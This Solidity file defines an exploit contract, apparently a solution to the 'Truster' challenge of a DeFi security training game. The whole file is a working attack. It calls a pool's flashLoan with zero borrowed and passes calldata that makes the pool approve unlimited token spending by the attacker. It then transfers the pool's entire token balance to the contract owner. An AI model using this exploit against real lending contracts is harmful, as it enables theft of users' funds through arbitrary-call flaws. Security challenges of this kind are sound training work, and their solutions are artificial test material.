// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IPool {
  function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
  ) external;
}

contract TrusterExploit {
  address owner;

  constructor() {
    owner = msg.sender;
  }

  function attack(IPool _pool, IERC20 _token) external {
    bytes memory data = abi.encodeWithSignature(
      "approve(address,uint256)",
      address(this),
      type(uint256).max
    );

    _pool.flashLoan(0, address(this), address(_token), data);

    _token.transferFrom(address(_pool), owner, _token.balanceOf(address(_pool)));
  }
}
